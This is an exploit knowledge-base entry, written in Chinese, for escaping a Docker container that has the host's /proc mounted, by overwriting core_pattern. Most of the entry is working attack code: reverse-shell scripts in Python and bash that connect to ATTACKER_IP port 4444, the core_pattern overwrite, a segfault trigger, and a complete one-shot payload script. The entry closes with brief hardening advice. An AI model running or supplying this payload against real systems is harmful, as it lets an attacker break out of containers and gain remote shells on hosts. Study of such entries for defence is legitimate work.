---
id: DOCKER-PROCFS-ESCAPE
title: Docker 挂载宿主机 procfs 逃逸
product: docker
vendor: Docker
version_affected: "all versions (kernel >= 2.6.19)"
severity: HIGH
tags: [container_escape, procfs, core_pattern, rce, docker, 无需认证]
fingerprint: ["Docker", "docker", "core_pattern", "procfs"]
---

## 漏洞描述

当容器挂载了宿主机的 `/proc` 目录时，攻击者可以通过覆写 `/proc/sys/kernel/core_pattern` 实现容器逃逸。Linux内核从2.6.19版本起支持在 core_pattern 中使用管道符 `|`，首字符为 `|` 时剩余内容会被当作程序执行。

## 影响版本

- Docker 全版本（Linux kernel >= 2.6.19，挂载宿主机 /proc 的容器）

## 前置条件

- 已获取容器内命令执行权限
- 容器挂载了宿主机的 `/proc` 目录
- 容器内可写文件系统（需写入exploit脚本）
- 宿主机内核 >= 2.6.19（支持 core_pattern 管道符）

## 检测方法

```bash
# 查找是否存在两个core_pattern文件
find / -name core_pattern 2>/dev/null
# 如果找到两个，说明挂载了宿主机procfs
```

## 利用步骤

### Step 1: 获取容器在宿主机的绝对路径

```bash
cat /proc/mounts | grep workdir
# 输出类似: overlay / overlay ... workdir=/var/lib/docker/overlay2/xxx/work
# 容器路径: /var/lib/docker/overlay2/xxx/merged
```

或者：
```bash
cat /proc/1/cgroup | head -1 | sed 's/.*docker\///' | head -c 12
# 获取容器ID，拼接路径
```

### Step 2: 写入反弹shell脚本

```bash
cat > /tmp/.exploit.py << 'EOF'
#!/usr/bin/python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
chmod +x /tmp/.exploit.py
```

### Step 3: 覆写core_pattern

```bash
# 假设容器路径为 /var/lib/docker/overlay2/xxx/merged
echo "|/var/lib/docker/overlay2/xxx/merged/tmp/.exploit.py" > /host/proc/sys/kernel/core_pattern
```

### Step 4: 触发core dump

```bash
# 编译并运行触发段错误的程序
cat > /tmp/crash.c << 'EOF'
#include <stdio.h>
int main() {
    int *p = NULL;
    *p = 1;
    return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
ulimit -c unlimited
/tmp/crash
```

## Payload

```bash
# Step 1: 获取容器在宿主机的overlay路径
CONTAINER_PATH=$(cat /proc/mounts | grep workdir | head -1 | sed 's/.*workdir=\(\/var\/lib\/docker\/overlay2\/[^/]*\).*/\1\/merged/')

# Step 2: 写入反弹shell脚本
cat > /tmp/.exploit.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /tmp/.exploit.sh

# Step 3: 覆写宿主机core_pattern（通过挂载的宿主机procfs）
echo "|${CONTAINER_PATH}/tmp/.exploit.sh" > /host_proc/sys/kernel/core_pattern

# Step 4: 触发core dump执行payload
cat > /tmp/crash.c << 'EOF'
#include <stdio.h>
int main() { int *p = NULL; *p = 1; return 0; }
EOF
gcc /tmp/crash.c -o /tmp/crash && ulimit -c unlimited && /tmp/crash
```

## 验证方法

```bash
# 确认宿主机procfs已挂载（存在两个core_pattern）
find / -name core_pattern 2>/dev/null | wc -l
# 返回2表示宿主机procfs已挂载

# 确认core_pattern可写
echo test > /host_proc/sys/kernel/core_pattern 2>/dev/null && echo "可写" || echo "不可写"

# 确认容器overlay路径可获取
cat /proc/mounts | grep workdir | head -1
```

## 指纹确认

```bash
find / -name core_pattern 2>/dev/null | wc -l
cat /proc/sys/kernel/core_pattern
mount | grep proc
```

## 修复建议

1. 不要将宿主机 /proc 挂载到容器中
2. 使用 `--read-only` 限制容器文件系统
3. 启用 AppArmor/SELinux 限制 core_pattern 修改
